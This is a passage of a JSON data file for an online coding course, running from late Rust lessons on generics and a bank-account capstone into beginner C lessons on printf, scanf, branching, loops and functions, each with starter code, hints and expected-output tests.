twice; this is allowed only because of the bound. (Using ^x^ twice also works since ^5^ and ^\"hi\"^ are Copy.)\n- ^show_twice(5)^ uses ^T = i32^; ^show_twice(\"hi\")^ uses ^T = &str^.\n\nOutput:\n\n~~~\n5 5\nhi hi\n~~~\n\n## Try it\n\nCall ^show_twice(2.5)^ too: it works for decimals with no new code.\n\n## Your task\n\nWrite ^largest<T: PartialOrd + Copy>^ returning the biggest item of a non-empty slice. For ^[3, 7, 2]^ it returns ^7^; for ^['a','z','c']^ it returns ^z^. Idea: start with the first item, then loop and replace it whenever you see a bigger one.","starter":"fn largest<T: PartialOrd + Copy>(list: &[T]) -> T {\n    todo!()\n}\n","hint":"Start with list[0] and update when item > best.","terms":[{"term":"generic","def":"Code written with a placeholder type that works for many real types."},{"term":"T","def":"A common name for a placeholder type."},{"term":"trait bound","def":"A requirement on a generic type, like T: Copy."},{"term":"PartialOrd","def":"Trait for types that can be compared with < and >."},{"term":"Copy","def":"Trait for types that are duplicated instead of moved."},{"term":"slice","def":"A borrowed view of a run of items, written &[T]."},{"term":"Display","def":"Trait for types that can be printed with {}."}],"image":{"url":"/diagrams/rust/generics.svg","caption":"Visual diagram: Generics"},"isUnitTest":false,"fileName":"main.rs","tests":[{"name":"Test 1","input":"","expected":"7\n1.5\nz\n-9"}],"usesInput":false,"hasHarness":true},{"id":"capstone-bank","number":"8.5","title":"Capstone: Bank Account","content":"## Putting it together\n\nTime to combine **structs** (custom types holding data in named **fields**), **methods** (functions in an ^impl^ block), ^Result^ and **mutable borrowing**. ^&mut self^ means a method borrows the value and is allowed to change it; ^&self^ only reads. Rust has no exceptions: a method that may fail returns ^Result^. ^Result<(), String>^ uses ^()^, the **unit** value meaning \"nothing useful\", so success is ^Ok(())^.\n\nA bank account is a nice model: a withdrawal that would overdraw must be refused and change nothing.\n\n## Example\n\n~~~\nstruct Jar { cookies: u32 }\n\nimpl Jar {\n    fn take(&mut self, n: u32) -> Result<(), String> {\n        if n > self.cookies {\n            Err(String::from(\"not enough\"))\n        } else {\n            self.cookies -= n;\n            Ok(())\n        }\n    }\n}\n\nfn main() {\n    let mut j = Jar { cookies: 5 };\n    println!(\"{:?}\", j.take(2));\n    println!(\"{:?}\", j.take(9));\n    println!(\"{}\", j.cookies);\n}\n~~~\n\n- ^struct Jar { cookies: u32 }^ has one field.\n- ^&mut self^ lets ^take^ change the field.\n- The ^if^ checks first, so a failed take changes nothing.\n- ^-=^ subtracts in place; ^Ok(())^ signals success.\n- ^let mut j^ is mutable so we may call ^take^.\n\nOutput:\n\n~~~\nOk(())\nErr(\"not enough\")\n3\n~~~\n\n## Try it\n\nChange ^j.take(9)^ to ^j.take(3)^: it now succeeds and the last line is ^0^.\n\n## Your task\n\nImplement ^Account^:\n\n- ^Account::new(balance: u32)^ creates an account.\n- ^deposit(&mut self, amount: u32)^ adds to the balance.\n- ^withdraw(&mut self, amount: u32) -> Result<(), String>^: on success subtract and return ^Ok(())^; if the balance is too low change nothing and return ^Err(\"insufficient funds\")^.\n- ^balance(&self) -> u32^ returns the balance.","starter":"struct Account {\n    balance: u32,\n}\n\nimpl Account {\n    fn new(balance: u32) -> Account {\n        todo!()\n    }\n    fn deposit(&mut self, amount: u32) {\n        todo!()\n    }\n    fn withdraw(&mut self, amount: u32) -> Result<(), String> {\n        todo!()\n    }\n    fn balance(&self) -> u32 {\n        todo!()\n    }\n}\n","hint":"Check amount > self.balance before subtracting.","terms":[{"term":"struct","def":"A custom type grouping named fields."},{"term":"field","def":"A named piece of data inside a struct."},{"term":"&mut self","def":"The method borrows the value and may change it."},{"term":"()","def":"The unit value, meaning nothing useful; Ok(()) is a bare success."},{"term":"Result","def":"Either Ok(value) or Err(error)."},{"term":"impl","def":"Block where a type's methods are written."}],"image":{"url":"/diagrams/rust/capstone-bank.svg","caption":"Visual diagram: Capstone: Bank Account"},"isUnitTest":true,"fileName":"main.rs","tests":[{"name":"Test 1","input":"","expected":"Ok(())\nErr(\"insufficient funds\")\n120\nOk(())\n0"}],"usesInput":false,"hasHarness":true}]}]},{"id":"c","title":"C Programming","language":"C","languageId":"c","description":"Master systems programming from the ground up: pointers, memory management, structs, and hardware efficiency.","units":[{"id":"foundations","title":"Foundations of C & Standard I/O","lessons":[{"id":"hello-c","number":"1.1","title":"Hello, C: The Origin Story","content":"## The Origin of Modern Computing\n\nIn 1972 at Bell Labs, Dennis Ritchie sat down to build an operating system named Unix. He needed a language that was as blindingly fast as raw assembly machine code, yet clean enough for human beings to read. He created **C**.\n\nLike Daft Punk's anthem *\"Harder, Better, Faster, Stronger\"* or Taylor Swift boldly stepping into Manhattan in *\"Welcome to New York\"*, C stripped away every ounce of fluff. It gives you direct, uninhibited control over the computer's CPU and memory. Fifty years later, the foundations of the digital world—Windows, Linux, macOS, Python, game engines, and the flight computers on NASA spacecraft—are all written in C.\n\n## Anatomy of a C Program\n\n~~~\n#include <stdio.h>\n\nint main(void) {\n    printf(\"Hello, World!\\n\");\n    return 0;\n}\n~~~\n\nLet's break down every single piece with zero assumed knowledge:\n\n- ^#include <stdio.h>^ - This is a **preprocessor directive**. Think of it as opening a toolbox. It tells the compiler to grab standard input and output tools (like ^printf^) before building your program.\n- ^int main(void)^ - The main stage door. Every C program begins running at the ^main^ function. The ^int^ means this function finishes by handing an integer number back to the operating system. ^void^ inside the parentheses means \"takes no input parameters\".\n- ^{ ... }^ - Curly braces group together the block of instructions that belong to the function.\n- ^printf(\"Hello, World!\\n\");^ - A function call that prints text to the screen (**standard output**). The ^\\n^ is an **escape sequence** representing a newline character, just like pressing Enter on your keyboard.\n- ^;^ - Every individual instruction (statement) in C must terminate with a semicolon.\n- ^return 0;^ - By convention, returning ^0^ to the operating system means: *\"Everything ran cleanly with zero errors!\"*\n\n## Predict & Observe\n\nWhat happens if you remove the ^\\n^ from inside the quotes? The text still prints, but any next program running in your terminal would print right on the same line! What happens if you remove the semicolon? The C compiler stops dead in its tracks and refuses to build your binary.\n\n## Your Task\n\nWrite a complete, valid C program inside ^main.c^ that:\n1. Includes the ^<stdio.h>^ header.\n2. Defines the ^main^ function.\n3. Uses ^printf^ to print ^Hello, World!^ followed by a newline (^\\n^).\n4. Returns ^0^ to signal clean execution.","starter":"#include <stdio.h>\n\nint main(void) {\n    // Print \"Hello, World!\\n\" below and return 0\n\n    return 1;\n}\n","hint":"Include <stdio.h>, call printf(\"Hello, World!\\n\"); inside main, and end with return 0;","terms":[{"term":"compiler","def":"A program (like GCC) that translates human-readable C source code into machine code that your CPU executes."},{"term":"#include","def":"A preprocessor command that pulls in standard library headers before compilation begins."},{"term":"<stdio.h>","def":"Standard Input/Output header file, providing printf, scanf, and stream tools."},{"term":"main","def":"The mandatory starting point and entry function for every C program."},{"term":"printf","def":"A standard library function that formats and prints text to the terminal screen."},{"term":"newline (\\n)","def":"A special escape character that moves the cursor down to the start of the next line."},{"term":"return 0","def":"An exit code sent back to the operating system signaling successful program termination."}],"image":{"url":"/diagrams/c/hello-c.svg","caption":"The C build pipeline: source code compiles into native machine instructions that write directly to stdout."},"isUnitTest":false,"fileName":"main.c","tests":[{"name":"Prints Hello, World!","input":"","expected":"Hello, World!"}],"usesInput":false,"hasHarness":false},{"id":"format-specifiers","number":"1.2","title":"Format Specifiers: The Universal Translator","content":"## Speaking Every Data Type Fluently\n\nIn *Star Wars*, the golden droid C-3PO is fluent in over six million forms of communication. In C, ^printf^ is your program's universal translator.\n\nBecause C is a **statically typed** language, numbers, letters, and text are stored as fundamentally different patterns of magnetic charges in your hardware. To display them, ^printf^ relies on **format specifiers**—special placeholders beginning with a percent sign (^%^) that tell C how to translate each byte into readable characters on your screen.\n\n## The Core Four Format Specifiers\n\n- ^%d^ - Decimal Integer (e.g. ^42^, ^-7^).\n- ^%f^ - Floating-point decimal (e.g. ^3.141592^). Use ^%.1f^ or ^%.2f^ to specify how many decimal places to round to!\n- ^%c^ - A single character enclosed in single quotes (e.g. ^'A'^, ^'!'^).\n- ^%s^ - A string of characters enclosed in double quotes (e.g. ^\"Starliner\"^).\n- ^%%^ - Prints a literal percent sign symbol.\n\nLook at how arguments match placeholders in order:\n\n~~~\nchar grade = 'A';\nint crew = 42;\nfloat fuel = 98.75f;\nconst char ship[] = \"Starliner\";\n\nprintf(\"Ship: %s [%c] | Crew: %d | Fuel: %.1f%%\\n\", ship, grade, crew, fuel);\n~~~\n\nOutput:\n~~~\nShip: Starliner [A] | Crew: 42 | Fuel: 98.8%\n~~~\n\nNotice how ^%.1f^ neatly rounded ^98.75^ up to ^98.8^, and ^%%^ produced the single ^%^ character.\n\n## Predict & Observe\n\nWhat happens if you accidentally pass a float into ^%d^? C will not give you a polite warning; it will re-interpret the floating-point bit pattern as an integer, producing wildly incorrect garbage numbers. Precision and matching types is everything in C!\n\n## Your Task\n\nThe orbital transport console needs to report vessel telemetry. The variables ^grade^, ^crew^, ^fuel^, and ^ship^ are already declared for you.\n\nReplace the placeholder in ^printf^ so the program outputs exactly:\n\n~~~\nShip: Starliner [A] | Crew: 42 | Fuel: 98.8%\n~~~","starter":"#include <stdio.h>\n\nint main(void) {\n    char grade = 'A';\n    int crew = 42;\n    float fuel = 98.75f;\n    const char ship[] = \"Starliner\";\n\n    // Use printf with %s, %c, %d, and %.1f to print the telemetry line:\n    printf(\"TODO\\n\");\n    return 0;\n}\n","hint":"Use printf(\"Ship: %s [%c] | Crew: %d | Fuel: %.1f%%\\n\", ship, grade, crew, fuel);","terms":[{"term":"format specifier","def":"A placeholder starting with % that tells printf how to interpret and print variable data."},{"term":"%d","def":"Format placeholder for signed decimal integers."},{"term":"%f","def":"Format placeholder for single or double precision floating-point numbers."},{"term":"%.1f","def":"Format modifier that rounds a float to exactly 1 decimal digit."},{"term":"%c","def":"Format placeholder for a single ASCII character."},{"term":"%s","def":"Format placeholder for a null-terminated string of characters."}],"image":{"url":"/diagrams/c/format-specifiers.svg","caption":"How printf format specifiers map placeholders (%s, %c, %d, %.1f) directly to supplied variables."},"isUnitTest":false,"fileName":"main.c","tests":[{"name":"Telemetry line printed accurately","input":"","expected":"Ship: Starliner [A] | Crew: 42 | Fuel: 98.8%"}],"usesInput":false,"hasHarness":false},{"id":"scanf-input","number":"1.3","title":"Reading Input with scanf: Address Required","content":"## Delivery to a Physical Address\n\nWhen an owl delivers a letter to Harry Potter at *\"The Cupboard under the Stairs, 4 Privet Drive\"*, the owl doesn't just drop the letter into thin air. It needs the exact physical street address of the destination.\n\nIn C, variables reside in physical cells of your computer's RAM. When you want to read user input from the keyboard, the standard function is ^scanf^. But ^scanf^ cannot do its job if you only give it the name of the variable: it needs the **address** of where that variable lives in memory.\n\nThat is why we use the **address-of operator** (^&^).\n\n## How scanf Works\n\n~~~\nint age;\nprintf(\"Enter age: \");\nscanf(\"%d\", &age);\n~~~\n\n- ^\"%d\"^ tells ^scanf^ to parse characters typed by the user as a decimal integer.\n- ^&age^ gives ^scanf^ the memory pointer to the exact bytes where ^age^ is stored.\n- As soon as the user presses Enter, ^scanf^ writes the parsed number directly into that memory cell.\n\nTo read multiple values separated by spaces, you can supply multiple specifiers:\n\n~~~\nint level;\nint xp;\nscanf(\"%d %d\", &level, &xp);\n~~~\n\n## Predict & Observe\n\nWhat happens if you accidentally write ^scanf(\"%d\", level);^ without the ^&^?\nThe program will treat the current uninitialized value of ^level^ (say, ^0^) as a memory address and attempt to write data there. The operating system detects this illegal memory access and instantly kills your program with a **Segmentation Fault (core dumped)**!\n\n## Your Task\n\nRead two integers from standard input:\n1. The player's ^level^.\n2. The player's ^xp^.\n\nThen print the formatted profile string:\n\n~~~\nPlayer Level: <level>, XP: <xp>\n~~~","starter":"#include <stdio.h>\n\nint main(void) {\n    int level = 0;\n    int xp = 0;\n\n    // Use scanf to read level and xp from stdin into &level and &xp\n\n    printf(\"Player Level: %d, XP: %d\\n\", level, xp);\n    return 0;\n}\n","hint":"Use scanf(\"%d %d\", &level, &xp); to read both values from standard input.","terms":[{"term":"scanf","def":"A standard C function that reads formatted input from the standard input stream (keyboard)."},{"term":"address-of operator (&)","def":"A unary operator that evaluates to the physical memory address of a variable."},{"term":"segmentation fault","def":"A fatal runtime error that occurs when a program attempts to access memory it does not own."},{"term":"stdin","def":"Standard input stream, typically characters fed from keyboard or piped input."}],"image":{"url":"/diagrams/c/scanf-input.svg","caption":"Why scanf requires the & (address-of) operator to drop values into physical RAM cells."},"isUnitTest":false,"fileName":"main.c","tests":[{"name":"Player Rank 10","input":"10 2500","expected":"Player Level: 10, XP: 2500"},{"name":"Max Level Champion","input":"99 99999","expected":"Player Level: 99, XP: 99999"},{"name":"Rookie Starter","input":"1 50","expected":"Player Level: 1, XP: 50"}],"usesInput":true,"hasHarness":false},{"id":"unit-1-test","number":"1.4","title":"Unit 1 Test: Pop Concert Ticket Calculator","content":"## Mission Briefing: Box Office Grand Opening\n\nYou have been hired as lead systems engineer for the world tour ticketing engine (think Taylor Swift's *Eras Tour* meets Daft Punk's *Alive*). Millions of fans are in queue, and the box office terminal must run with zero lag, zero memory leaks, and 100% mathematical accuracy down to the cent.\n\nIn this Unit 1 Test, you will combine everything you have learned:\n- Header inclusion and ^main^ function structure.\n- Reading formatted inputs from standard input using ^scanf^ and ^&^.\n- Floating-point calculations.\n- Formatting currency outputs strictly to 2 decimal places (^%.2f^).\n\n## Mathematical Specification\n\nGiven:\n- ^tickets^ (integer): The number of tickets purchased.\n- ^price^ (float): The base price per ticket.\n\nCalculate:\n1. ^subtotal = tickets * price^\n2. ^tax = subtotal * 0.08^ (8% municipal entertainment tax)\n3. ^total = subtotal + tax^\n\n## Required Receipt Output Format\n\n~~~\n--- CONCERT RECEIPT ---\nTickets: <tickets> @ $<price>\nSubtotal: $<subtotal>\nTax: $<tax>\nTotal: $<total>\n~~~\n\nAll monetary values (^price^, ^subtotal^, ^tax^, ^total^) must be formatted with ^%.2f^.\n\n## Example\n\nInput:\n~~~\n2 89.50\n~~~\n\nOutput:\n~~~\n--- CONCERT RECEIPT ---\nTickets: 2 @ $89.50\nSubtotal: $179.00\nTax: $14.32\nTotal: $193.32\n~~~","starter":"#include <stdio.h>\n\nint main(void) {\n    int tickets = 0;\n    float price = 0.0f;\n\n    // TODO: Read tickets and price from standard input\n    // Calculate subtotal, 8% tax (subtotal * 0.08f), and grand total\n    // Print the formatted concert receipt\n\n    return 0;\n}\n","hint":"Read with scanf(\"%d %f\", &tickets, &price). Compute subtotal, tax = subtotal * 0.08f, and total = subtotal + tax. Format every price as $%.2f","terms":[{"term":"subtotal","def":"The initial cost before sales tax is applied (count multiplied by unit price)."},{"term":"floating-point precision","def":"Specifying exact decimal rounding in printf using syntax like %.2f."},{"term":"receipt layout","def":"Structured console text formatting mimicking physical retail thermal printers."}],"image":{"url":"/diagrams/c/unit-1-test.svg","caption":"The complete concert ticket calculation and thermal receipt printing pipeline."},"isUnitTest":true,"fileName":"main.c","tests":[{"name":"Pair of General Admission Tickets","input":"2 89.50","expected":"--- CONCERT RECEIPT ---\nTickets: 2 @ $89.50\nSubtotal: $179.00\nTax: $14.32\nTotal: $193.32"},{"name":"Four VIP Floor Passes","input":"4 150.00","expected":"--- CONCERT RECEIPT ---\nTickets: 4 @ $150.00\nSubtotal: $600.00\nTax: $48.00\nTotal: $648.00"},{"name":"Single Balcony Ticket","input":"1 45.25","expected":"--- CONCERT RECEIPT ---\nTickets: 1 @ $45.25\nSubtotal: $45.25\nTax: $3.62\nTotal: $48.87"}],"usesInput":true,"hasHarness":false}]},{"id":"logic-loops","title":"Logic, Decision Making & Loops","lessons":[{"id":"if-else","number":"2.1","title":"Branching: The Matrix Choice","content":"## The Red Pill or The Blue Pill\n\nIn *The Matrix*, Morpheus presents Neo with the ultimate choice:\n*\"You take the blue pill, the story ends, you wake up in your bed... You take the red pill, you stay in Wonderland, and I show you how deep the rabbit hole goes.\"*\n\nComputers make decisions using **conditional branching**. By evaluating expressions that evaluate to **true** (non-zero in C) or **false** (zero), your program chooses which block of code to run.\n\n## Syntax of if-else\n\n~~~\nif (condition) {\n    // executes if condition is true\n} else if (another_condition) {\n    // executes if first is false and second is true\n} else {\n    // fallback if all above were false\n}\n~~~\n\n## Comparison Operators\n\n- ^==^ - Equal to (Notice: two equal signs! A single ^=^ is assignment).\n- ^!=^ - Not equal to.\n- ^>^ and ^<^ - Greater than and less than.\n- ^>=^ and ^<=^ - Greater than or equal to, less than or equal to.\n\n## Predict & Observe\n\nWhat is the single most notorious bug in beginner C code? Writing ^if (choice = 1)^ instead of ^if (choice == 1)^! A single ^=^ assigns the value ^1^ to ^choice^, which evaluates to true every single time regardless of what the user chose. Always use double equals for comparisons.\n\n## Your Task\n\nRead an integer ^choice^ from standard input using ^scanf^:\n- If ^choice == 1^, print:\n  ^Red Pill chosen: You stay in Wonderland.^\n- If ^choice == 2^, print:\n  ^Blue Pill chosen: The story ends, wake up in your bed.^\n- Otherwise (any other number), print:\n  ^Unknown signal: The Matrix glitches.^\n\nRemember to end each output with a newline (^\\n^).","starter":"#include <stdio.h>\n\nint main(void) {\n    int choice = 0;\n\n    // TODO: Read choice from standard input with scanf\n    // Write if / else if / else branching to handle choices 1, 2, and other\n\n    return 0;\n}\n","hint":"Check if (choice == 1), else if (choice == 2), and else for all other numbers. Use == for comparisons.","terms":[{"term":"conditional branching","def":"The ability of a program to execute different instructions depending on whether a condition is true or false."},{"term":"if statement","def":"A control structure that executes an inner block of code only when its condition expression evaluates to true (non-zero)."},{"term":"else / else if","def":"Alternative paths executed when preceding if conditions evaluate to false."},{"term":"equality operator (==)","def":"Compares two values and evaluates to 1 (true) if they match, or 0 (false) if they differ."}],"image":{"url":"/diagrams/c/if-else.svg","caption":"Morpheus’s choice: how conditional if/else if/else branches guide code down distinct pathways."},"isUnitTest":false,"fileName":"main.c","tests":[{"name":"Pill Choice 1: Red Pill","input":"1","expected":"Red Pill chosen: You stay in Wonderland."},{"name":"Pill Choice 2: Blue Pill","input":"2","expected":"Blue Pill chosen: The story ends, wake up in your bed."},{"name":"Unexpected Glitch Input","input":"42","expected":"Unknown signal: The Matrix glitches."}],"usesInput":true,"hasHarness":false},{"id":"switch-case","number":"2.2","title":"Switch Statements: The Jukebox Selector","content":"## The Jukebox Mode Selector\n\nPicture an old-school diner jukebox or Spotify's playback bar: you press a single button to toggle **Shuffle**, **Repeat**, or **Autoplay**.\n\nWhen you need to compare a single variable against many discrete integer or character constants, a chain of ten ^if-else^ statements gets messy. C gives you the ^switch^ statement—a lightning-fast **jump table** that leaps directly to the matching case.\n\n## Anatomy of a Switch\n\n~~~\nchar mode;\nscanf(\" %c\", &mode);\n\nswitch (mode) {\n    case 'S':\n        printf(\"Mode [S]: Shuffle enabled.\\n\");\n        break;\n    case 'R':\n        printf(\"Mode [R]: Repeat enabled.\\n\");\n        break;\n    case 'A':\n        printf(\"Mode [A]: Autoplay enabled.\\n\");\n        break;\n    default:\n        printf(\"Mode [?]: Standard playback.\\n\");\n        break;\n}\n~~~\n\nNotice:\n- Each ^case^ ends with a colon (^:^).\n- ^break;^ is essential! If you forget ^break;^, C will **fall through** and execute all the subsequent cases below it, whether they matched or not!\n- ^default:^ runs if none of the cases matched (like the final ^else^ in an if-else chain).\n- In ^scanf(\" %c\", &mode)^, the leading space skips any whitespace or newline left in the buffer.\n\n## Predict & Observe\n\nWhat happens if you remove the ^break;^ after ^case 'S':^? If the user inputs ^'S'^, the program will print the Shuffle message *and* immediately print the Repeat message! Fallthrough is occasionally intentional in advanced C, but 99% of the time, missing a ^break^ is a classic bug.\n\n## Your Task\n\nRead a single character ^mode^ from standard input.\nUsing a ^switch^ statement:\n- Case ^'S'^: print ^Mode [S]: Shuffle enabled.^\n- Case ^'R'^: print ^Mode [R]: Repeat enabled.^\n- Case ^'A'^: print ^Mode [A]: Autoplay enabled.^\n- Default: print ^Mode [?]: Standard playback.^","starter":"#include <stdio.h>\n\nint main(void) {\n    char mode = ' ';\n\n    // TODO: Read mode using scanf(\" %c\", &mode)\n    // Implement switch (mode) with cases 'S', 'R', 'A', and default\n\n    return 0;\n}\n","hint":"Remember to include break; at the end of each case, and put a space before %c in scanf(\" %c\", &mode).","terms":[{"term":"switch","def":"A control structure that tests a variable against a list of constant values (cases)."},{"term":"case","def":"A label inside a switch representing a specific constant value to match."},{"term":"break","def":"A statement that immediately exits the switch block, preventing fallthrough."},{"term":"default","def":"The fallback case in a switch statement that runs when no other case matches."},{"term":"fallthrough","def":"The behavior where execution continues into subsequent cases when break is omitted."}],"image":{"url":"/diagrams/c/switch-case.svg","caption":"The switch jump table: matching discrete labels and using break to cleanly exit."},"isUnitTest":false,"fileName":"main.c","tests":[{"name":"Shuffle Mode","input":"S","expected":"Mode [S]: Shuffle enabled."},{"name":"Repeat Mode","input":"R","expected":"Mode [R]: Repeat enabled."},{"name":"Autoplay Mode","input":"A","expected":"Mode [A]: Autoplay enabled."},{"name":"Default Fallback Mode","input":"Z","expected":"Mode [?]: Standard playback."}],"usesInput":true,"hasHarness":false},{"id":"while-for-loops","number":"2.3","title":"Loops: Groundhog Day & Training Montages","content":"## Repeating Until the Mission is Complete\n\nIn the classic movie *Groundhog Day*, Bill Murray is trapped in a loop, waking up at 6:00 AM to the same radio alarm every single day until he figures out how to live a meaningful life. In *Rocky*, the training montage shows repetition after repetition until the boxer is ready for the championship fight.\n\nComputers never get tired. A loop lets a CPU repeat a block of instructions thousands, millions, or billions of times without breaking a sweat.\n\n## The for Loop\n\nThe most common loop in C is the ^for^ loop, which bundles initialization, condition check, and step into one clean line:\n\n~~~\nfor (int i = 0; i < 5; i++) {\n    printf(\"%d \", i);\n}\n~~~\n\nOutput: ^0 1 2 3 4 ^\n\n- ^int i = 0;^ - **Initialization**: creates a counter variable ^i^ (runs once at start).\n- ^i < 5;^ - **Condition**: checked before every repetition. If true, loop continues; if false, loop stops.\n- ^i++^ - **Step**: increments ^i^ by 1 after each pass.\n\n## Accumulating Values\n\nLoops often calculate running totals using an **accumulator**:\n\n~~~\nint sum = 0;\nfor (int i = 1; i <= n; i++) {\n    sum += i; // Equivalent to: sum = sum + i;\n}\n~~~\n\n## Predict & Observe\n\nWhat happens if your condition is always true, such as ^for (int i = 5; i > 0; i++)^?\nBecause ^i^ starts at 5 and keeps growing, ^i > 0^ is never false. This creates an **infinite loop**. The CPU will run at 100% until your operating system or timeout kills it!\n\n## Your Task\n\nRead an integer ^n^ from standard input.\n1. Print a countdown starting at ^n^ down to ^1^ separated by spaces, followed by ^BLASTOFF!^:\n   Example for n = 5:\n   ^Countdown: 5 4 3 2 1 BLASTOFF!^\n2. Using a loop, calculate the sum of all integers from ^1^ to ^n^. On a new line, print:\n   ^Sum: <sum>^","starter":"#include <stdio.h>\n\nint main(void) {\n    int n = 0;\n\n    // TODO: Read n from stdin\n    // Print \"Countdown: \" followed by n down to 1 and \"BLASTOFF!\\n\"\n    // Calculate and print \"Sum: <sum>\\n\"\n\n    return 0;\n}\n","hint":"Use for (int i = n; i >= 1; i--) for countdown, and another loop to compute sum += i from 1 to n.","terms":[{"term":"loop","def":"A control structure that repeats a block of instructions while a condition remains true."},{"term":"for loop","def":"A loop that packs initialization, condition, and increment into a single header statement."},{"term":"accumulator","def":"A variable initialized before a loop used to collect running sums or products."},{"term":"infinite loop","def":"A defect where a loop condition never becomes false, freezing program execution."},{"term":"increment / decrement","def":"Operators (++ and --) that add or subtract 1 from an integer."}],"image":{"url":"/diagrams/c/while-for-loops.svg","caption":"The four-phase lifecycle of a loop: initialize, condition check, execute body, and step."},"isUnitTest":false,"fileName":"main.c","tests":[{"name":"Five Second Launch","input":"5","expected":"Countdown: 5 4 3 2 1 BLASTOFF!\nSum: 15"},{"name":"Three Second Quick Launch","input":"3","expected":"Countdown: 3 2 1 BLASTOFF!\nSum: 6"},{"name":"Immediate Launch (n=1)","input":"1","expected":"Countdown: 1 BLASTOFF!\nSum: 1"}],"usesInput":true,"hasHarness":false},{"id":"unit-2-test","number":"2.4","title":"Unit 2 Test: Retro Arcade Level Progression & High Score Filter","content":"## Mission Briefing: The Neon Arcade Championship\n\nYou are programming the main tournament screen for a 1980s retro arcade (think *Tron*, *Pac-Man*, and *Stranger Things* Palace Arcade). Contenders from across the city are feeding tokens into the machines. Your C program must process incoming player scores in real-time, filter out players who meet the qualification threshold, and preserve the ultimate high score on the leaderboard.\n\nIn this Unit 2 Test, you will synthesize:\n- Loops and iteration counters.\n- Conditional statements and comparisons (^>=^).\n- Accumulating running statistics (qualifier count and high score peak).\n- Structured console output formatting.\n\n## Specification\n\n1. Read an integer ^n^: the number of players participating.\n2. In a loop from player ^1^ to ^n^:\n   - Read that player's integer ^score^.\n   - If ^score >= 1000^:\n     Print: ^Player <index>: <score> [QUALIFIED]^\n     Increment the count of qualified players.\n     If this ^score^ is greater than the current high score, update the high score.\n   - Else (^score < 1000^):\n     Print: ^Player <index>: <score> [TRY AGAIN]^\n3. After evaluating all players, print the tournament roster summary:\n   ~~~\n   --- TOURNAMENT ROSTER ---\n   Qualified: <qualified_count> / <n>\n   High Score: <high_score>\n   ~~~\n\nNote: If no player qualifies (or all scores are under 1000), ^High Score^ should remain ^0^.\n\n## Example\n\nInput:\n~~~\n4\n1200 450 3400 950\n~~~\n\nOutput:\n~~~\nPlayer 1: 1200 [QUALIFIED]\nPlayer 2: 450 [TRY AGAIN]\nPlayer 3: 3400 [QUALIFIED]\nPlayer 4: 950 [TRY AGAIN]\n--- TOURNAMENT ROSTER ---\nQualified: 2 / 4\nHigh Score: 3400\n~~~","starter":"#include <stdio.h>\n\nint main(void) {\n    int n = 0;\n\n    // TODO: Read n (number of players)\n    // Loop through each player from 1 to n\n    // Read their score, print [QUALIFIED] or [TRY AGAIN]\n    // Track qualified count and high score\n    // Print the final --- TOURNAMENT ROSTER ---\n\n    return 0;\n}\n","hint":"Loop from i = 1 to n. Inside the loop, read each score. If score >= 1000, qualified++ and check if score > high_score.","terms":[{"term":"stream processing","def":"Reading and evaluating sequential items one by one inside a loop."},{"term":"threshold filtering","def":"Testing each data element against a minimum criterion to qualify or discard."},{"term":"maximum tracking","def":"An algorithm that compares each item against a peak record variable, replacing it when higher."}],"image":{"url":"/diagrams/c/unit-2-test.svg","caption":"Processing streams of arcade tournament scores, filtering qualifiers and tracking the peak high score."},"isUnitTest":true,"fileName":"main.c","tests":[{"name":"Mixed Roster of 4 Players","input":"4\n1200 450 3400 950","expected":"Player 1: 1200 [QUALIFIED]\nPlayer 2: 450 [TRY AGAIN]\nPlayer 3: 3400 [QUALIFIED]\nPlayer 4: 950 [TRY AGAIN]\n--- TOURNAMENT ROSTER ---\nQualified: 2 / 4\nHigh Score: 3400"},{"name":"All Star Trio (100% Qualify)","input":"3\n1500 2200 1800","expected":"Player 1: 1500 [QUALIFIED]\nPlayer 2: 2200 [QUALIFIED]\nPlayer 3: 1800 [QUALIFIED]\n--- TOURNAMENT ROSTER ---\nQualified: 3 / 3\nHigh Score: 2200"},{"name":"Under-levelled Duo (0 Qualify)","input":"2\n500 700","expected":"Player 1: 500 [TRY AGAIN]\nPlayer 2: 700 [TRY AGAIN]\n--- TOURNAMENT ROSTER ---\nQualified: 0 / 2\nHigh Score: 0"}],"usesInput":true,"hasHarness":false}]},{"id":"functions","title":"Functions & Modular Code","lessons":[{"id":"function-basics","number":"3.1","title":"Functions: The Mission Impossible Gadget Dispenser","content":"## The Gadget Dispenser\n\nIn *Mission: Impossible*, Ethan Hunt receives a specialized gadget dispenser from IMF headquarters: you feed in the mission requirements, it does the technical heavy lifting, and hands back exactly the tool you need.\n\nA **function** is a reusable, named subprogram. Instead of stuffing hundreds of lines of code into ^main^, you break complex software down into clean, modular building blocks.\n\n## The Two-Part Rule in C: Prototype & Definition\n\nBecause the C compiler reads your code strictly from top to bottom, it must be warned that a function exists before it encounters any call to it. That requires two steps:\n\n1. **Function Prototype** (Forward Declaration): Placed at the top of the file, ending in a semicolon. Tells the compiler the function's name, return type, and parameter types.\n2. **Function Definition**: The actual code block inside curly braces, usually placed below ^main^.\n\n~~~\n#include <stdio.h>\n\n// 1. Prototype\nint calculate_shield(int base, int multiplier);\nvoid display_status(int shield);\n\nint main(void) {\n    int shield = calculate_shield(10, 5);\n    display_status(shield);\n    return 0;\n}\n\n// 2. Definition\nint calculate_shield(int base, int multiplier) {\n    return base * multiplier;\n}\n\nvoid display_status(int shield) {\n    printf(\"Shield Integrity: %d%%\\n\", shield);\n}\n~~~\n\nNotice that ^display_status^ has return type ^void^: this means it executes actions (printing) but does not return a value back to the caller.\n\n## Predict & Observe\n\nWhat happens if you delete the prototype at the top and leave the function definition at the bottom below ^main^?\nIn older C compilers, you got an implicit declaration warning; in modern C11, the compiler flags an error: ^call to undeclared function^. Always declare prototypes at the top of your file.\n\n## Your Task\n\nImplement the prototypes and definitions for:\n1. ^int calculate_shield(int base, int multiplier);^ which returns ^base * multiplier^.\n2. ^void display_status(int shield);^ which prints:\n   ^Shield Integrity: <shield>%^ followed by a newline.\n\nInside ^main^, read two integers (^base^ and ^multiplier^) from standard input, calculate the shield value, and display it using ^display_status^.","starter":"#include <stdio.h>\n\n// TODO: Write prototypes for calculate_shield and display_status\n\nint main(void) {\n    int base = 0;\n    int multiplier = 0;\n\n    // TODO: Read base and multiplier from standard input\n    // Call calculate_shield and then display_status\n\n    return 0;\n}\n\n// TODO: Implement calculate_shield and display_status definitions\n","hint":"Declare prototypes before main. In main, read base and multiplier, call int s = calculate_shield(base, multiplier), then display_status(s).","terms":[{"term":"function prototype","def":"A forward declaration that introduces a function name and type signature before its definition."},{"term":"return type","def":"The data type (such as int, double, or void) that a function returns to its caller."},{"term":"parameter","def":"A placeholder variable listed in the function definition that receives input values."},{"term":"argument","def":"The concrete value passed into a function when calling it."},{"term":"void","def":"A special type 